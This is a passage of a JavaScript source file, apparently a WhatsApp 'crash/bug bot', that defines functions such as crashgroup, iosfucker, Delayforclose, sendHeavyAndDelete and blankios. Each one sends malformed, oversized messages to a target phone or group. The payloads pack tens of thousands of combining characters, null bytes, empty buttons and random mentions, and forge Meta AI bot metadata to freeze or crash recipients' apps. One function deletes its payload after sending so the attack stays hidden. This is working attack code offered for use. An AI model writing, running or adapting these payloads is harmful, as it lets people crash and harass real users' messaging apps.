                                mentionedJid: [
                                    "0@s.whatsapp.net",
                                    ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                                ]
                            }
                        }
                    }
                }
            }, { participant: groupJid });
            floodCount++;
        } catch (e) {
            // Silent
        }
    }
    debugLog(`[NewUpdateV1] Flood loop done — ${floodCount} messages sent`);

    // ── Stage 8: final heavy extended text ──
    try {
        await sock.relayMessage(groupJid, {
            groupStatusMessageV2: {
                nativeFlowMessage: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(9000),
                        contextInfo: {
                            participant: groupJid,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: groupJid });
        debugLog(`[NewUpdateV1] Stage 8 done (final text)`);
    } catch (e) {
        debugLog(`[NewUpdateV1] Stage 8 failed: ${e.message}`);
    }

    debugLog(`[NewUpdateV1] ✅ Complete`);
}

// ==================== crashgroup (multi-phase) ====================
async function crashgroup(sock, target, preResolved) {
    debugLog(`[crashgroup] Executing on ${target}`);

    const resolved = preResolved || await resolveGroupJid(sock, target);
    const { groupJid, groupName } = resolved;

    debugLog(`[crashgroup] Group: "${groupName}" (${groupJid})`);
    debugLog(`[crashgroup] === Phase 1/3: uistuck ===`);
    await uistuck(sock, groupJid);
    await sleep(2000);

    debugLog(`[crashgroup] === Phase 2/3: NewUpdateV1 ===`);
    await NewUpdateV1(sock, groupJid);
    await sleep(2000);

    debugLog(`[crashgroup] === Phase 3/3: blankios ===`);
    await blankios(sock, groupJid);

    debugLog(`[crashgroup] ✅ Multi-phase cycle complete`);
}

// ==================== iosfucker ====================
async function iosfucker(socket, recipient) {
    debugLog(`💥 Executing iosfucker on ${recipient}`);

    try {
        await socket.relayMessage(
            recipient,
            {
                contactMessage: {
                    displayName: "🎭⃟༑⌁⃰NOCTHERxXYLENTxEXFOLD🐉" + "𑇂𑆵𑆴𑆿".repeat(10000),
                    vcard: "BEGIN:VCARD\n" +
                        "VERSION:3.0\n" +
                        "N:;𑇂𑆵𑆴𑆿" + "𑇂𑆵𑆴𑆿".repeat(10000) + ";;;\n" +
                        "FN:𑇂𑆵𑆴𑆿" + "𑇂𑆵𑆴𑆿".repeat(10000) + "\n" +
                        "NICKNAME:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "ORG:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "TITLE:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "item1.TEL;waid=6287873499996:+62 878-7349-9996\n" +
                        "item1.X-ABLabel:Telepon\n" +
                        "item2.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "item2.X-ABLabel:Kantor\n" +
                        "item3.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "item3.X-ABLabel:Kantor\n" +
                        "item4.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "item4.X-ABLabel:Pribadi\n" +
                        "item5.ADR:;;𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + ";;;;\n" +
                        "item5.X-ABADR:ac\n" +
                        "item5.X-ABLabel:Rumah\n" +
                        "X-YAHOO;type=KANTOR:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "PHOTO:\n" +
                        "X-WA-BIZ-NAME:𑇂𑆵𑆴𑆿" + "ᩫᩫ".repeat(4000) + "\n" +
                        "END:VCARD",
                    contextInfo: {
                        externalAdReply: {
                            automatedGreetingMessageShown: true,
                            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
                            greetingMessageBody: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨⁉️"
                        }
                    }
                }
            },
            {
                participant: recipient,
                noSelfSync: true
            }
        );

        debugLog(`✅ iosfucker executed successfully on ${recipient}`);
        return { success: true, recipient };
    } catch (err) {
        debugLog(`❌ iosfucker failed on ${recipient}: ${err.message}`);
        throw err;
    }
}

// ==================== iosnew ====================
async function iosnew(socket, recipient, targets = null) {
    debugLog(`💥 Executing iosnew on ${recipient}`);

    const jids = [];
    const src = targets && targets.length ? targets : [recipient];
    for (const t of src) {
        const clean = String(t || "").replace(/\D/g, "");
        if (clean) jids.push(clean.includes("@") ? clean : clean + "@s.whatsapp.net");
    }

    if (!jids.length) {
        debugLog("❌ iosnew: empty target list");
        throw new Error("iosnew: empty target list");
    }

    const mkMeta = (batch) => [{
        tag: "meta",
        attrs: {},
        content: [{
            tag: "mentioned_users",
            attrs: {},
            content: batch.map((jid) => ({ tag: "to", attrs: { jid }, content: undefined }))
        }]
    }];

    const buildMsg = () => generateWAMessageFromContent("status@broadcast", {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [],
                    unifiedResponse: {
                        data: Buffer.from(JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: [
                                {
                                    view_model: {
                                        primitive: {
                                            text: "Xsyam For The Newest Bugs",
                                            inline_entities: ["{".repeat(500000)],
                                            __typename: "GenAIMarkdownTextUXPrimitive",
                                        },
                                        __typename: "GenAISingleLayoutViewModel",
                                    }
                                }
                            ]
                        }))
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardOrigin: 4,
                        forwardedAiBotMessageInfo: {
                            botJid: "0@bot"
                        }
                    }
                }
            }
        }
    }, {});

    try {
        const BATCH = 5;
        const ids = [];
        let batchNo = 0;

        for (let bi = 0; bi < jids.length; bi += BATCH) {
            const batch = jids.slice(bi, bi + BATCH);
            batchNo++;
            const suf = batchNo > 1 ? "-" + batchNo : "";
            const msg = buildMsg();

            await socket.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id + suf,
                statusJidList: batch,
                additionalNodes: mkMeta(batch),
                noSelfSync: true
            });

            ids.push(msg.key.id);

            if (batchNo > 1) {
                await sleep(300);
            }
        }

        debugLog(`✅ iosnew completed — ${ids.length} payload(s) sent`);
        return ids;
    } catch (err) {
        debugLog(`❌ iosnew failed: ${err.message}`);
        return [];
    }
}

// ==================== DelayXOnceExtesion ====================
async function DelayXOnceExtesion(sock, target) {
    debugLog(`[DelayXOnceExtesion] Executing on ${target}`);

    const msg = {
        groupStatusMessageV2: {
            message: {
                viewOnceMessageV2Extension: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "\u200B\u2060".repeat(10000),
                                subtitle: "\uFEFF\u202F".repeat(10000)
                            },
                            body: {
                                text: "\u180E\u061C".repeat(20000)
                            },
                            nativeFlowMessage: {
                                buttons: "\uFFF9\uFFFA".repeat(70000) + "\uFFFB\u2060".repeat(30000),
                                messageParamsJson: "\u200B\u202F".repeat(10000)
                            },
                            contextInfo: {
                                stanzaId: "\uFEFF\u180E".repeat(1000),
                                mentionedJid: [
                                    "\u061C\u200B".repeat(1000)
                                ],
                                forwardingScore: 4294967295,
                                isForwarded: true,
                                expiration: 4294967295
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, {
        noSelfSync: true
    });

    debugLog(`[DelayXOnceExtesion] ✅ Completed for ${target}`);
}

// ==================== Delayforclosev2 ====================
async function Delayforclosev2(sock, target) {
    debugLog(`[Delayforclosev2] Executing on ${target}`);

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32),
                    deviceListMetadata: {
                        senderKeyIndex: 0,
                        senderTimestamp: Date.now(),
                        recipientKeyIndex: 0
                    },
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1999 }, () =>
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        )
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 80000 }, () => ({})),
                        extra1: "\u0000".repeat(500000),
                        extra2: "\u0000".repeat(500000),
                        extra3: "\u0000".repeat(500000),
                        extra4: "\u0000".repeat(500000),
                        extra5: "\u0000".repeat(500000),
                        extra6: Array.from({ length: 80000 }, () => ({}))
                    },
                    body: { text: "$serraa" }
                }
            }
        }
    }, {});

    debugLog(`[Delayforclosev2] ✅ Completed for ${target}`);
}

// ==================== Delayforclose ====================
async function Delayforclose(sock, target) {
    debugLog(`[Delayforclose] Executing on ${target}`);

    try {
        const t0 = Date.now();
        const rnd = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;

        const pool = new Set();
        while (pool.size < 1999) pool.add("1" + rnd(0, 8999999) + "@s.whatsapp.net");
        const jids = [...pool];

        const mkBtns = n => new Array(n).fill(0).map(() => ({}));
        const NUL = String.fromCharCode(0);

        const native = {};
        const nfKeys = [
            ["buttons", () => mkBtns(80000)],
            ["extra1", () => NUL.repeat(20000)],
            ["extra2", () => NUL.repeat(10000)],
            ["extra3", () => NUL.repeat(20000)],
            ["extra4", () => NUL.repeat(40000)],
            ["extra5", () => NUL.repeat(2000)],
            ["extra6", () => mkBtns(80000)],
        ];
        nfKeys.sort(() => Math.random() - 0.5);
        for (const [k, fn] of nfKeys) native[k] = fn();

        const inter = Object.fromEntries([
            ["contextInfo", { mentionedJid: jids }],
            ["nativeFlowMessage", native],
            ["body", { text: "$derr" }],
        ]);

        const msg = {
            groupStatusMessageV2: { message: { interactiveMessage: inter } }
        };

        let ok = false, tries = 0;
        while (!ok && tries < 3) {
            try {
                await sleep(rnd(200, 800));
                await sock.relayMessage(target, msg, {});
                ok = true;
            } catch (err) {
                tries++;
                if (tries >= 3) throw err;
                await sleep(rnd(500, 1500));
            }
        }

        debugLog(`[Delayforclose] ✅ Sent (${Date.now() - t0}ms, ${tries + 1}x tries)`);
    } catch (e) {
        debugLog(`[Delayforclose] ❌ ERROR: ${e.message}`);
    }
}

// ==================== sendHeavyAndDelete ====================
async function sendHeavyAndDelete(socket, recipient, buttonCount = 500_000) {
    if (!socket || !recipient) {
        throw new Error("❌ socket and recipient JID required");
    }

    debugLog(`[sendHeavyAndDelete] Executing on ${recipient} with ${buttonCount} buttons`);

    const payload = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "HeavyPayload",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "ြ ".repeat(5000) + " LexzyMods"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: buttonCount }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            albumMessage: {
                                expectedImageCount: 9999,
                                expectedVideoCount: 9999
                            }
                        }
                    }
                }
            }
        }
    };

    try {
        const msg = generateWAMessageFromContent(recipient, payload, {});

        const messageId = await socket.relayMessage(recipient, msg.message, {
            messageId: msg.key.id,
            noSelfSync: true,
        });

        const key = {
            remoteJid: recipient,
            id: messageId || msg.key.id,
            fromMe: true,
        };

        if (!key.id) {
            throw new Error(`No valid message ID returned from relayMessage`);
        }

        debugLog(`[sendHeavyAndDelete] ✅ Heavy message (${buttonCount} buttons) sent, key: ${key.id}, deleting in 2000ms...`);

        await sleep(2000);

        await socket.sendMessage(recipient, {
            delete: {
                key: {
                    remoteJid: recipient,
                    id: key.id,
                    fromMe: true,
                },
            },
        });

        debugLog(`[sendHeavyAndDelete] ✅ Heavy message deleted from ${recipient} (invisible)`);
        return { success: true };
    } catch (err) {
        debugLog(`[sendHeavyAndDelete] ❌ Failed: ${err.message}`);
        return { success: false, error: err.message };
    }
}

// ==================== blankios ====================
async function blankios(sock, target) {
    debugLog(`[BlankIOS] Executing on ${target}`);

    const buffer1 = {
        interactiveMessage: {
            interactiveMessage: {
                header: {
                    title: "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
                    subtitle: "666",
                    hasMediaAttachment: false
                },
                body: { text: "Apa yang ingin anda lakukan?" },
                footer: { text: "Nishiki" },
                nativeFlowMessage: {
                    buttons: [
                        { name: "quick_reply", buttonParamsJson: "{\"display_text\":\"Opsi 1\",\"id\":\"opt_1\"}" },
                        { name: "quick_reply", buttonParamsJson: "{\"display_text\":\"Opsi 3\",\"id\":\"opt_3\"}" }
                    ],
                    messageParamsJson: "{}"
                },
                mtype: "interactiveMessage",
                id: "3EB002CBD0A177798DC757",
                chat: "135759822622788@lid",
                isBaileys: false,
                sender: "215178549395532@lid",
                fromMe: false,
                text: "",
                mentionedJid: []
            }
        }
    };

    let data;
    try {
        data = JSON.stringify(buffer1, null, 2);
    } catch (stringifyErr) {
        debugLog(`[BlankIOS] JSON stringify error: ${stringifyErr.message}`);
        data = '{}';
    }

    const buffer = Buffer.from(data, 'utf8');

    const MakLoX = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
                    submessages: [{ messageType: "AI_RICH_RESPONSE_TEXT", messageText: "MakLo" }],
                    unifiedResponse: {
                        data: Buffer.from(JSON.stringify({
                            response_id: "666",
                            sections: [
                                {
                                    view_model: {
                                        primitive: {
                                            text: "",
                                            __typename: "GenAIMarkdownTextUXPrimitive"
                                        },
                                        __typename: "GenAISingleLayoutViewModel"
                                    }
                                },
                                {
                                    view_model: {
                                        primitive: {
                                            language: "Gunma",
                                            code_blocks: [
                                                { "content": "MakLo🪭\n\n\n", "type": "NUMBER" },
                                                { "content": buffer, "type": "STR" }
                                            ],
                                            __typename: "GenAICodeUXPrimitive"
                                        },
                                        __typename: "GenAISingleLayoutViewModel"
                                    }
                                },
                                {
                                    view_model: {
                                        primitive: {
                                            text: "",
                                            __typename: "GenAIMarkdownTextUXPrimitive"
                                        },
                                        __typename: "GenAISingleLayoutViewModel"
                                    }
                                }
                            ]
                        })).toString("base64")
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botName: "Meta AI",
                            botJid: "13135550002@s.whatsapp.net",
                            creatorName: "Meta"
                        }
                    }
                }
            }
        }
    };

    try {
        const msg = generateWAMessageFromContent(target, MakLoX, {});

        await sock.relayMessage(target, msg.message, {
            noSelfSync: true,
            messageId: msg.key.id,
        });

        debugLog(`[BlankIOS] ✅ Completed for ${target}`);
    } catch (err) {
        debugLog(`[BlankIOS] ❌ Failed: ${err.message}`);
        throw err;
    }
}

// ==================== START ====================
run();